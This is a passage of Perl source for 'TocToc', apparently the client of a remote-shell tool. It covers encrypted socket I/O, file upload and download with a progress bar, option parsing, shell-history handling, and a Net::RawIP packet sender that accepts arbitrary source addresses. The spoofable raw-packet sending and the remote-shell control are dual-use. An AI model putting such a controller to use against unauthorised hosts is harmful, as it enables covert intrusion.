     my ($msg, $total_bytes, $init_time);
     my $got_info = 0;
     my $cur_byte = 0;

     while ( 1 ) {
       my @ready = $sel_transfer->can_read(1);

       foreach my $fh (@ready) {

         my $nread = ($protocol eq "tcp" ? sysread($fh, $msg, $buffer) : $fh->recv($msg, $buffer));

         if ($nread == 0 and $protocol eq "tcp") {
           ShutDownTransfer("Connection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nTransfer: Operation aborted!\n");

             return(undef);
           }
         } else {
           if ($got_info == 0) {
             if ($msg =~ /^(\d+)$/) {
               $total_bytes = $1;
               clear_last();
               out("Stats: Saving file in $local_file ($total_bytes bytes). Type ^C to abort.\n");
               my $pack = pack("N", 0);
               ($protocol eq "tcp" ? syswrite($fh, $pack, length($pack)) : $fh->send($pack) );
               $init_time = timem();

             } else {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
             }
             $got_info = 1;
           } else {
              my $size = length($msg);
              $cur_byte += $size;
              print FILE $msg;
              my $packbyte = pack("N", $cur_byte);
              #syswrite($fh, $packbyte, length($packbyte));
              ($protocol eq "tcp" ? syswrite($fh, $packbyte, length($packbyte)) : $fh->send($packbyte) );

              ProgressBar($init_time, $cur_byte, $total_bytes);

              if ($cur_byte == $total_bytes) {
                ShutDownTransfer("\nTransferation completed! File has been saved.\n");
                close(FILE);
                return(1);
              }
           }
         }
       }
     }
   }

   sub put {
     my ($local_file, $remote_file, $bind_port) = @_;

     unless (-e "$local_file") {
       out("File ($local_file) doesn't exist.\n");
       return(undef);
     }

     unless(open(FILE, "< $local_file")) {
       out("Could not open file ($local_file) for reading.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     return(undef) unless (SetUpTransfer($port, "PUT $remote_file $port"));

     my $msg;
     my $bytes = (stat("$local_file"))[7];

     my $first_msg = 1;
     my $init_time;
     while ( 1 ) {
       my @ready = $sel_transfer->can_read(1);

       foreach my $fh (@ready) {
          my $nread;
          ($protocol eq "tcp" ? $nread = sysread($fh, $msg, $buffer) : $fh->recv($msg, $buffer));

         if ($nread == 0 and $protocol eq "tcp") {
           ShutDownTransfer("\nConnection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nOperation aborted!\n");
             return(undef);
           }
         } else {
             if ($first_msg == 1) {
               $first_msg = 0;
               unless($msg eq "OK") {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
               }
               $fh->send($bytes);
               clear_last();
               out("Stats: Sending file $local_file ($bytes bytes)\n");
               $init_time = timem();
               next;
             }
             my $sended_bytes = unpack("N", $msg);

             ProgressBar($init_time, $sended_bytes, $bytes) unless ($sended_bytes == 0);

             if ($sended_bytes == $bytes) {
                ShutDownTransfer("\nTransferation completed! File has been sended.\n");
                close(FILE);
                return(1);
             }
             my $send_bytes;
             seek(FILE, $sended_bytes, 0);
             read(FILE, $send_bytes, 1024);
             $fh->send($send_bytes);

         }
       }
     }
   }

   ##################
   # Transfer Stuff #
   ##################

   sub TestTransferPort {
     my $bind_port = shift;
     my $port = TestBindPort($bind_port);

     unless($port) {
       out("I could not listen on port: $bind_port\n");
       return(undef);
     }
     return($port);
   }

   sub SetUpTransfer {
     my ($port, $spm) = @_;

   #  ShutDownTransfer(); # any non-canceled tranfer?

     my $transfer;
     my %new = ( LocalPort => "$port", Proto => "$protocol");
     $new{Listen} = "1" if ($protocol eq "tcp");

     my $transfer = IO::Socket::INET->new( %new );

     unless($transfer) {
       out("Freak error on binding local port: $port\n");
       return(undef);
     }

     spm($spm) if ($spm);

     out("Stats: Waiting for the server...");

     my $initc = time;
     my $ready;
     while ((time-$initc) <= $TIMEOUT) {
        $ready = is_ready($transfer, 1);
        last if($ready);
     }
     clear_last();

     if ($ready) {
       out("Stats: Server connected!");
     } else {
       out("Stats: Operation timed out! Server didn't connect.\n");
       return(undef);
     }

     if ($protocol eq "tcp") {
       my $remote = $transfer->accept;
       $remote->autoflush(1);
       $sel_transfer->add($remote);
       $transfer->close;
     } else {
        $sel_transfer->add($transfer);
     }

     $sel_transfer->add(\*STDIN);
     ReadMode 4;
     return(1);
   }

   sub ShutDownTransfer {
     my $msg = shift;
     foreach my $fh ($sel_transfer->can_write(1)) {
       $sel_transfer->remove($fh);
       unless ($fh eq \*STDIN) {
         $fh->close() if($fh);
       }
     }
     out($msg) if (defined($msg));
     ReadMode 0;
     sleep(1);
     return(1);
   }


   # i like the wget look so i based this function on it :)
   sub ProgressBar {
     my ($init_time, $saved_bytes, $total_bytes) = @_;

     # time  #
     my $d_time = (timem()-$init_time);

     # size #
     my $unit = "Kb/s";
     my $Sps = ($saved_bytes/$d_time) / 1024;
     if ($Sps > 1024) {
        $Sps = $Sps/1024;
        $unit = "Mb/s";
     }
     $Sps = round($Sps, 2);


     # percentage #
     my $percent = ($saved_bytes*100)/$total_bytes;
     $percent = round($percent, 1);

     # i hope someone teach me a better way :/
     my $s_saved_bytes = reverse($saved_bytes);
     $s_saved_bytes =~ s/(...)/$1,/g;
     $s_saved_bytes = reverse($s_saved_bytes);
     $s_saved_bytes =~ s/^\,//;
     my $s_total_bytes = reverse($total_bytes);
     $s_total_bytes =~ s/(...)/$1,/g;
     $s_total_bytes = reverse($s_total_bytes);
     $s_total_bytes =~ s/^\,//;

     # calculating ETA #
     my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);
     my $eta_h = int($eta_s/3600);
     $eta_s %= 3600;
     my $eta_m = int($eta_s/60);
     $eta_s %= 60;
     $eta_h = "0$eta_h" if (length($eta_h) == 1);
     $eta_m = "0$eta_m" if (length($eta_m) == 1);
     $eta_s = "0$eta_s" if (length($eta_s) == 1);

     # positionating the info on the screen #
     my $show_percent = fill_space($percent, 6);
     my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));
     my $show_Sps = fill_space($Sps, 9);
     my $show_eta = fill_space("$eta_h:$eta_m:$eta_s", 9);
     $show_eta = "--:--:--" if (length($show_eta) > 9);

     my $total_chars = length(" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta");

     # bars #
     my $total_bars = $term_size[0]-5-$total_chars;
     if($total_bars < 10) {
        out("Your terminal size is too small\r");
        return;
     }

     my $bar_per_byte = $total_bars/$total_bytes;
     my $bars_n = $bar_per_byte * $saved_bytes;

     # yeah u know 0.something may do this
     $bars_n = $total_bars if ($saved_bytes == $total_bytes);
     $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);

     my $bars = "=" x $bars_n;
     my $blank_n = $total_bars-$bars_n;
     my $blank = " " x $blank_n;
     $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);
     $blank .= ' ' if ($total_bars != $bars_n);

     my $blank_end = " " x 5;

     out("\r $show_percent% \033[1m"."[$bars$blank]"."\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end");

   }

   #############
   #   HELP    #
   #############

   sub HelpCMD {
     my $cmd = shift;

     out("\n\033[1m  - ".uc($cmd)." - \033[0m\n\n");
     out("   \033[1mAbout\033[0m: ".$HELP{$cmd}{about}."\n\n");

     for (my $c = 1; ; $c++) {
       unless(defined($HELP{$cmd}{"help$c"})) {
         out("\n") if ($c != 1);
         last;
       }
       if ($c == 1) {
         out("    \033[1mHelp\033[0m: ".$HELP{$cmd}{"help$c"}."\n");
       } else {
          out("          ".$HELP{$cmd}{"help$c"}."\n");
       }
     }
     out(" \033[1mSintaxe\033[0m: ".$HELP{$cmd}{syntax}."\n") if defined($HELP{$cmd}{syntax});
     out(" \033[1mExample\033[0m: ".$HELP{$cmd}{example}."\n") if defined($HELP{$cmd}{example});
     out("\n") if (defined($HELP{$cmd}{syntax}) or defined($HELP{$cmd}{example}));
   }

   sub ShowHelp {
     my $cmd = lc(shift);
     if ($cmd) {
       if ($cmd eq "help") {
          out("No help available for command help.\n");
       } elsif (grep { lc($_) eq $cmd } @commands ) {
           HelpCMD($cmd);
       } else {
           out("Command '$cmd' doesn't exist.\n");
       }
       return();
     }
     out("            \033[1mTocToc Help\033[0m\n\n");
     foreach my $command (@commands) {
       out(" \033[1m".fill_space($command, 10)."\033[0m - ".$HELP{lc($command)}{about}."\n");
     }
     out("\nType: help <command>\n\n");
   }


   #################
   #  Write Stuff  #
   #################

   sub clear {
     out($clear);
   }

   # Send Protocol Message
   # those messages are interpreted instead
   # of to be written on the shell
   sub spm {
     my $cmd = shift;
     check_connection();
     write_sock("\001T:$cmd:\002\n", $proto_sock);
   }

   # write directly to socket
   sub write_sock {
     return(write_tcp_sock(@_)) if ($protocol eq "tcp");
     return(write_udp_sock(@_)) if ($protocol eq "udp");
   }

   sub write_tcp_sock {
     my ($send, $proto) = @_;

     my $send_sock = $proto_sock;
     unless ($proto) {
       $send = $cipher->encrypt($send)."$EOC" unless ($opt{ncrypt});
       $send_sock = $sock;
     }

     return(undef) unless ($send_sock);
     return(syswrite($send_sock, $send, length($send)));
   }

   sub write_udp_sock {
     my ($send, $proto) = @_;

     my $socket = $proto_sock;
     if ($proto) {
        return(undef) unless($got_first_udp);
     } else {
       $send = $cipher->encrypt($send)."$EOC" unless ($opt{ncrypt});
       $socket = $bind;
     }

     my @send = split ('', $send);
     my $sent = 0;
     while ( 1 ) {
       my $send_now = join('', @send[$sent .. ($sent+$buffer-1)]);
       return(1) unless ($send_now);
       $sent += $buffer;
       select(undef, undef, undef, $UDP_DELAY);
       $socket->send($send_now);
     }
   }



   # the out() sends the args to STDOUT only
   # here we send it to the shell history too
   sub write_out {
     my $msg = shift;
   #  $msg =~ s/\001T:.+?:\002\n//g; # probably answer of aborted commands or a bug
     return() if ($msg eq '');

     write_shell_hist($msg);
     out($msg) if ($menu_act == 0);
   }

   sub out {
     my $msg = join('', @_);
     syswrite(STDOUT, $msg, length($msg));
   }

   sub write_shell_hist {
     my $hist = shift;

     while ($hist =~ /\n/) {
       $hist =~ /^(.*?\n)/;
       my $hist_line = $1;
       $hist =~ s/^.*?\n//;

       $SHELL_HIST{$shell_hist_counter} = '' if (not defined($SHELL_HIST{$shell_hist_counter}));
       $SHELL_HIST{$shell_hist_counter} .= $hist_line;
       $shell_hist_counter++;
     }
     $SHELL_HIST{$shell_hist_counter} = '' if (not defined($SHELL_HIST{$shell_hist_counter}));
     $SHELL_HIST{$shell_hist_counter} .= $hist;


     if ($shell_hist_counter >= $shell_hist_max) {
        my %NEW_HIST;
        for (my $c = $shell_hist_counter; $c > 0; $c--) {
           my $new_c = $c-($shell_hist_counter-$shell_hist_max);
           last if ($new_c <= 0);
           $NEW_HIST{$new_c} = $SHELL_HIST{$c};
        }
        %SHELL_HIST = %NEW_HIST;
        $shell_hist_counter = $shell_hist_max;
     }

   }

   ############
   #  Others  #
   ############

   # I preffer to do it my way :)
   sub getopts {
     # eheh a little explanation
     # the key is the same used in the return
     # the value gonna be the options to be taken from @ARGV
     # separeted by |
     # after the "," you can give these options:
     #
     # : - take next ARGV as value
     #
     # by now ... just this one is fine :) if none options specified
     # the return gonna be 1 or 0
     #
     # the key STD should has only the options made by one letter
     # like the Getopts::Std, eg:
     #
     # my %opts = getopts(a => "a", b => "b", c => "c,:", d => "d");
     #                     =
     # my %opts = getopts(STD => "abc:d");
     #
     # $opts{UNKNOWN} gonna has the unknown options given by the user
     # $opts{MISS_VALUE} gonna has the options which need some value
     # and it has been not given

     my %opts = @_;

     my %ret;

     if (defined($opts{STD})) {
        my @opts = split('', $opts{STD});

        for (my $c = 0; $c <= $#opts; $c++) {
          my $arg = $opts[$c];
          my $next_arg = $opts[$c+1];
          next if ($arg eq ":");
          $opts{$arg} = "$arg";
          $opts{$arg} .= ",:" if ($next_arg eq ":");
        }

        delete($opts{STD});
     }

     for (my $ca = 0; $ca <= $#ARGV; $ca++) {
        my $arg = $ARGV[$ca];
        my $rarg = $arg;
        last if ($arg eq "--");
        my $next_arg = $ARGV[$ca+1];

        # if not an argument it is some value
        my ($is_arg, $next_is_arg) = (0, 0);
        $is_arg = 1 if ($arg =~ /^-{1,2}/);
        $arg =~ s/^-{1,2}//;
        $next_is_arg = 1 if ($next_arg =~ /^-{1,2}/);
        $next_arg =~ s/^-{1,2}//;

        next if ($is_arg == 0);

        my $value;
        if ($arg =~ /^(.+?)\=(.*)$/) {
           $arg = $1;
           $value = $2;
        }

        my $found = 0;
        foreach my $opt (keys(%opts)) {
           my $opt_value = $opts{$opt};

           my $get_value = 0; # if get_value == 0 is a true/false (1/0) return

           $get_value = 1 if ($opt_value =~ /\,(.*)$/);
           my @types = split('', $1);

           $opt_value =~ s/\,.*$//;


           my @get_opts = split(/\|/, $opt_value);

           if (grep { $_ eq "$arg" } @get_opts) {
              #delete($opts{$opt}); nahh the last value is great for me
              $found = 1;
              if ($get_value == 0) {
                 $ret{$opt} = 1;
              } else {
                  my $ret_value = ((defined($value)) ? $value : (defined($next_arg) ? $next_arg : undef));
                  if (defined($ret_value)) {
                     if (!@types or grep { $_ eq ":" } @types) {
                       $ret{$opt} = $ret_value;
                     } else {
                        my @wrong;
                        foreach my $type (@types) {
                          my $ok = 1;
                          $ok = 0 if (
                             ($type eq "n" and $ret_value !~ /^\d+$/) or
                             ($type eq "i" and $ret_value !~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/));
                             # i thing thats only by now
                          push(@wrong, $type) if ($ok == 0);
                        }

                        if (@wrong) {
                          $ret{WRONG_VALUE} .= "$rarg,".join('', @wrong)."|";
                        } else {
                            $ret{$opt} = $ret_value;
                        }
                     }
   #               if (defined($value)) {
   #                  $ret{$opt} = $value;
   #               } elsif ($next_is_arg == 0 and defined($next_arg)) {
   #                   $ret{$opt} = $next_arg;
                  } else {
                      $ret{MISS_VALUE} .= "$rarg|";
                  }
              }
           }
        }

        $ret{UNKNOWN} .= "$rarg|" if ($found == 0);
     }


     $ret{UNKNOWN} =~ s/\|$// if (defined($ret{UNKNOWN}));
     $ret{MISS_VALUE} =~ s/\|$// if (defined($ret{MISS_VALUE}));
     $ret{WRONG_VALUE} =~ s/\|$// if (defined($ret{WRONG_VALUE}));

     return(%ret);
   }

   # I stolen this function from comp.pl
   sub gen_key {
   # $Id: comp.pl,v 1.6 2001/08/12 20:05:02 lackas Exp $

           my $size = shift;
           my $res;
           while ($size > 0) {
                   $size -= 8;
                   $res .= pack 'C', rand 256;
           }
           $res;
   }


   sub check_connection {
     return(1) if ($protocol ne "tcp");
     if (not defined($proto_sock->peerhost) or not defined($sock->peerhost)) {
       finish("\nDesconnected!\n");
     }
     return(1);
   }


   # so we can read without blocking
   sub fhread {
     my $fh = shift;
     my $timeout = shift || 0;

     my $got_msg = '';
     my $msg;
     while ( my $ready = is_ready($fh, $timeout)) {
       last if ($ready == 0);
       sysread($fh, $msg, $buffer);
       $got_msg .= $msg;
     }

     return($got_msg);
   }

   sub is_ready {
     my ($fh, $time) = @_;
     $time = 0 unless($time);
     my $read = '';
     vec($read, fileno($fh), 1) = 1;
     my $ready = 0;
     $ready = select($read, undef, undef, $time);
     return($ready);
   }

   sub fill_space {
     my ($chars, $max) = @_;
     my $filled = length($chars);
     my $space_n  = $max-$filled;
     return($chars) if ($space_n <= 0);

     my $space = " " x $space_n;

     return($space.$chars);
   }


   sub round {
     my ($number, $decimals) = @_;

     my ($int,$dec) = split('\.', $number);

     return("$int.".("0" x $decimals)) unless (defined($dec));

     my @dec_ns = split('', $dec);

     return("$int.$dec".("0" x ($decimals-(scalar(@dec_ns)))))
       if (scalar(@dec_ns) < $decimals);

     my $last_on_next = 0;
     for (my $c = $#dec_ns; $c >= 0; $c--) {
       if ($dec_ns[$c] >= 5) {
         if (($c-1) < 0) {
           $int++;
         } else {
            $dec_ns[$c-1]++;
         }
         $dec_ns[$c] = 0;
       }
       last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);
       last if ($c == $decimals and $dec_ns[$c-1] != 10);
       $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);
     }

     my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);

     my $dot = "." if ($decimals != 0);
     return("$int$dot$new_dec");
   }


   sub clear_last {
     my $spaces = " " x $term_size[0];
     out("\r$spaces\r");
   }


   sub TestBindPort {
     my $port = shift;

     my %new;
     if ($protocol eq "tcp") {
        %new = (Listen => 1 ,Proto => 'tcp');
     } else {
        %new = (Proto => 'udp');
     }

     if (defined($port)) {
       $new{LocalPort} = "$port";
       my $test = IO::Socket::INET->new( %new ) || return(undef);
       $test->close;
       return($port);
     } else {
         my $rport = int(rand(64511))+1024;
         $new{LocalPort} = $rport;

         my $test = IO::Socket::INET->new( %new );
         my $port = $test->sockport;
         $test->close;
         return($port);
     }
   }


   sub show_shell_buff {
     my $lines = $term_size[1];

     my @screen;
     my $c = $shell_hist_counter-1;
     my $shown_lines = 0;

     push(@screen, $SHELL_HIST{$shell_hist_counter}) if (defined($SHELL_HIST{$shell_hist_counter}));

     while (defined($SHELL_HIST{$c})) {
        my $line = $SHELL_HIST{$c};
        $shown_lines += scalar(split(/\n/, $line));
        push(@screen, $line);

        $c--;
     }

     clear();
     out(reverse(@screen));

   }


   # remind me to rewrite this function :P
   sub send_packet {
     my %PACKET = @_;
     my $proto = lc($PACKET{proto});
     my $packet;

     if ($proto eq "icmp") {
       $packet = new Net::RawIP({icmp=>{}});
       $packet->set({ip => { saddr => $PACKET{saddr}, daddr => $PACKET{daddr}, id => 0, tos => 0},
       icmp => {type => $PACKET{icmp_type}, code => $PACKET{icmp_code}, id => int(rand(9999)), sequence => int(rand(99999)), data => "$PACKET{data}"} });
     } elsif($proto eq "udp")  {
        $packet = new Net::RawIP({ ip=>{}, udp=>{}});
        $packet->set({ip => { saddr => $PACKET{saddr}, daddr => $PACKET{daddr}, id => int(rand(99999))} });
        $packet->set({udp => {source => $PACKET{source}, dest => $PACKET{dest}, data => $PACKET{data}} });
     } elsif($proto eq "tcp")  {
        $packet = new Net::RawIP({ ip=>{}, tcp=>{} });
        $packet->set({ip => { saddr => $PACKET{saddr}, daddr => $PACKET{daddr}, id => int(rand(99999))} });
        $packet->set({tcp => {source => $PACKET{source}, dest => $PACKET{dest}, data => $PACKET{data}, psh => 1, ack => 1} });
     } else {
        return(undef);
     }

     $packet->send($PACKET{delay}, $PACKET{'times'});
   }


   #  safely exit
   sub finish {
     my ($msg1,$msg2) = @_;

     if ($msg1 eq "INT") {
       undef($msg1);
       return(undef) if ($menu_act == 1);
     }

     out($msg1) if ($msg1);

     $sock->close()       if (defined($sock) and $protocol eq "tcp");
     $bind->close()       if (defined($bind));
     $proto_sock->close() if (defined($proto_sock));
     ReadMode 0;

     out($msg2) if ($msg2);
     out("\n");
     exit(0);
   }

   # It tells the server that the terminal size has changed
   sub winch {
     @term_size = GetTerminalSize(\*STDIN);
     spm("TERM_SIZE @term_size") if (defined(@term_size));
   }

   __END__
   # This function was removed
   # it has a little bug which do not let you write on the shell
   # after you hit ^C. This function gave me more problems the it
   # could give, so I give up :P
   # It was not a big deal waste my time with it
   #
   # If you tested this command and think that the bug should be fixed mail-me
   #sub sopen {
   #  my @args = @_;
   #
   #  my $sel_open = IO::Select->new($proto_sock);
   #  $sel_open->add(\*STDIN);
   #
   #  local($SIG{INT}) = sub  {
   #     spm("OPEN ABORT");
   #     out("\nOperation aborted!\n\n");
   #     $sel_open->remove(\*STDIN);
   #     $sel_open->remove($proto_sock);
   #
   #     goto \&menu;
   #  };
   #
   #  fhread($proto_sock); # flushing
   #
   #  out("Type ^C to abort.\n");
   #  print "_" x $term_size[0]."\n";
   #  spm("OPEN @args");
   #
   #
   #  my $keep_going = 1;
   #
   #  while ( $keep_going ) {
   #    foreach my $fh ($sel_open->can_read(1)) {
   #      my $buf;
   #      sysread($fh, $buf, $buffer);
   #      if ($fh eq $proto_sock) {
   #        if ($buf =~ /(.*)\003FINISHED-(.*)\002/) {
   #          out($1."\n$2\n");
   #          undef($keep_going);
   #          last;
   #        }
   #        out($buf);
   #      } else {
   #         syswrite($proto_sock, $buf, length($buf));
   #      }
   #    }
   #  }
   #  $sel_open->remove(\*STDIN);
   #  $sel_open->remove($proto_sock);
   #  return(1);
   #}
